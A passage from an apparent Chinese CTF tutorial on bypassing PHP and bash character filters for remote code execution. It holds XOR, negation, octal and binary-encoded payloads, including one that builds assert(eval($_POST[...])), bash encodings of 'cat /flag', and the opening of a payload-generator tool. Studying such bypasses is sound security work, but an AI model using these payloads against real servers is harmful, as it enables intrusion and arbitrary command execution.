class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">24</span>____%<span class="number">3</span>B%<span class="number">24</span>___(%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">20</span></span><br></pre></td></tr></table></figure><h2 id="无-绕过"><a href="#无-绕过" class="headerlink" title="无$_绕过"></a>无$_绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/a-z0-9<span class="subst">$_</span>/is&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题目是不允许a-z大小写，0-9然后是<code>$_</code>都不可用，这种一般出现在php7中，因为php7可以这样执行命令<code>($a)()</code>，我们完全通过异或或者取反的方式构造一个这种的exp<code>(system)((post)(_))</code>这样的形式，具体的其实就直接参考上面几种方法，通用的exp如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// `assert(eval($_POST[mochu7]))`</span></span><br><span class="line">(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)(~%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%<span class="number">92</span>%<span class="number">90</span>%<span class="number">9</span>C%<span class="number">97</span>%<span class="number">8</span>A%C8%A2%D6%D6);</span><br></pre></td></tr></table></figure><h1 id="进制形式绕过"><a href="#进制形式绕过" class="headerlink" title="进制形式绕过"></a>进制形式绕过</h1><p>遇到过的一般是8进制和2进制的，其他的一般可以用其他办法绕过，这里就单独说一下8进制和2进制，一般8进制的过滤长这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z\&quot;%*+,-.\/:;=&gt;?@[\]^`|]/&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到除了数字和<code>\</code>、<code>$</code>基本都被过滤了，这种的就可以尝试8进制了，而且他这个是可以直接<code>system</code>执行的，就是只要bash能解析即可，bash本身就可以解析8进制的内容，例如在终端中执行<code>$&#39;\154\163\40\55\154&#39;</code>就是执行<code>ls -l</code>，然后<code>cat /flag</code>就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="string">&#x27;\143\141\164\40\57\146\154\141\147&#x27;</span></span><br></pre></td></tr></table></figure><p>二进制的题目长这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z2-9\&quot;%*+,-.\/:;=&gt;?@[\]^`|]/&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接从数字中就可以看到是01可用<code>$</code>可用，还有一些其他的符号，这种可以考虑一下二进制了，毕竟0和1可以用，大致就是在提示你01了，具体利用的payload如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="number">0</span>&lt;&lt;&lt;$<span class="number">0</span>\&lt;\&lt;\&lt;\$\<span class="string">&#x27;\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#111001))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\&#x27;</span></span><br></pre></td></tr></table></figure><p>转换url编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">240</span>%<span class="number">3</span>C%<span class="number">3</span>C%<span class="number">3</span>C%<span class="number">240</span>%<span class="number">5</span>C%<span class="number">3</span>C%<span class="number">5</span>C%<span class="number">3</span>C%<span class="number">5</span>C%<span class="number">3</span>C%<span class="number">5</span>C%<span class="number">24</span>%<span class="number">5</span>C%<span class="number">27</span>%<span class="number">5</span>C%<span class="number">5</span>C%<span class="number">24</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">24</span>%<span class="number">28</span>%<span class="number">281</span>%<span class="number">3</span>C%<span class="number">3</span>C1%<span class="number">29</span>%<span class="number">29</span>%<span class="number">2310001111</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">5</span>C%<span class="number">5</span>C%<span class="number">24</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">24</span>%<span class="number">28</span>%<span class="number">281</span>%<span class="number">3</span>C%<span class="number">3</span>C1%<span class="number">29</span>%<span class="number">29</span>%<span class="number">2310001101</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">5</span>C%<span class="number">5</span>C%<span class="number">24</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">24</span>%<span class="number">28</span>%<span class="number">281</span>%<span class="number">3</span>C%<span class="number">3</span>C1%<span class="number">29</span>%<span class="number">29</span>%<span class="number">2310100100</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">5</span>C%<span class="number">5</span>C%<span class="number">24</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">24</span>%<span class="number">28</span>%<span class="number">281</span>%<span class="number">3</span>C%<span class="number">3</span>C1%<span class="number">29</span>%<span class="number">29</span>%<span class="number">23101000</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">5</span>C%<span class="number">5</span>C%<span class="number">24</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">24</span>%<span class="number">28</span>%<span class="number">281</span>%<span class="number">3</span>C%<span class="number">3</span>C1%<span class="number">29</span>%<span class="number">29</span>%<span class="number">23111001</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">5</span>C%<span class="number">5</span>C%<span class="number">24</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">24</span>%<span class="number">28</span>%<span class="number">281</span>%<span class="number">3</span>C%<span class="number">3</span>C1%<span class="number">29</span>%<span class="number">29</span>%<span class="number">2310010010</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">5</span>C%<span class="number">5</span>C%<span class="number">24</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">24</span>%<span class="number">28</span>%<span class="number">281</span>%<span class="number">3</span>C%<span class="number">3</span>C1%<span class="number">29</span>%<span class="number">29</span>%<span class="number">2310011010</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">5</span>C%<span class="number">5</span>C%<span class="number">24</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">24</span>%<span class="number">28</span>%<span class="number">281</span>%<span class="number">3</span>C%<span class="number">3</span>C1%<span class="number">29</span>%<span class="number">29</span>%<span class="number">2310001101</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">5</span>C%<span class="number">5</span>C%<span class="number">24</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">24</span>%<span class="number">28</span>%<span class="number">281</span>%<span class="number">3</span>C%<span class="number">3</span>C1%<span class="number">29</span>%<span class="number">29</span>%<span class="number">2310010011</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">5</span>C%<span class="number">27</span></span><br></pre></td></tr></table></figure><p>直接给一个通用exp,可以生成很多比较奇怪的符号的脚本，包括上面二进制的脚本你也这个脚本生成的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;BashFuck Payload <span class="built_in">Generator</span>&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: Arial, sans-serif;</span><br><span class="line">            margin: <span class="number">20</span>px;</span><br><span class="line">            background-color: <span class="comment">#f4f4f9;</span></span><br><span class="line">            color: <span class="comment">#333;</span></span><br><span class="line">        &#125;</span><br><span class="line">        h1 &#123;</span><br><span class="line">            color: <span class="comment">#333;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .input-container, .output-container &#123;</span><br><span class="line">            margin-bottom: <span class="number">20</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">        textarea, .output-container textarea &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            padding: <span class="number">10</span>px;</span><br><span class="line">            font-family: monospace;</span><br><span class="line">            border: <span class="number">2</span>px solid <span class="comment">#4a90e2;</span></span><br><span class="line">            border-radius: <span class="number">8</span>px;</span><br><span class="line">            resize: none;</span><br><span class="line">            font-size: <span class="number">14</span>px;</span><br><span class="line">            background-color: <span class="comment">#f0f8ff;</span></span><br><span class="line">            outline: none;</span><br><span class="line">            box-sizing: border-box;</span><br><span class="line">        &#125;</span><br><span class="line">        button &#123;</span><br><span class="line">            padding: <span class="number">10</span>px <span class="number">20</span>px;</span><br><span class="line">            font-size: <span class="number">16</span>px;</span><br><span class="line">            background-color: <span class="comment">#4a90e2;</span></span><br><span class="line">            color: white;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: <span class="number">8</span>px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            margin-top: <span class="number">10</span>px;</span><br><span class="line">            box-shadow: <span class="number">0</span>px <span class="number">2</span>px <span class="number">5</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        button:hover &#123;</span><br><span class="line">            background-color: <span class="comment">#357ab8;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .container &#123;</span><br><span class="line">            margin-bottom: <span class="number">30</span>px;</span><br><span class="line">            padding: <span class="number">20</span>px;</span><br><span class="line">            background-color: <span class="comment">#fff;</span></span><br><span class="line">            border-radius: <span class="number">10</span>px;</span><br><span class="line">            box-shadow: <span class="number">0</span>px <span class="number">0</span>px <span class="number">15</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">            border: <span class="number">2</span>px solid <span class="comment">#ddd;</span></span><br><span class="line">            box-sizing: border-box;</span><br><span class="line">        &#125;</span><br><span class="line">        .payload-info &#123;</span><br><span class="line">            font-weight: bold;</span><br><span class="line">            margin-bottom: <span class="number">10</span>px;</span><br><span class="line">            font-size: <span class="number">14</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">        .copy-btn &#123;</span><br><span class="line">            <span class="keyword">float</span>: right;</span><br><span class="line">            padding: <span class="number">8</span>px <span class="number">15</span>px;</span><br><span class="line">            background-color: <span class="comment">#4a90e2;</span></span><br><span class="line">            color: white;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: <span class="number">5</span>px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            font-size: <span class="number">14</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">        .copy-btn:hover &#123;</span><br><span class="line">            background-color: <span class="comment">#357ab8;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .output-container &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            flex-direction: column;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;BashFuck Payload <span class="built_in">Generator</span>&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;Enter your command below <span class="keyword">and</span> generate the payloads <span class="keyword">for</span> all formats.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">input</span>-<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">textarea</span> <span class="title">id</span>=&quot;<span class="title">cmdInput</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Enter</span> <span class="title">command</span> <span class="title">here</span>...&quot; <span class="title">rows</span>=&quot;3&quot;&gt;&lt;/<span class="title">textarea</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">button</span> 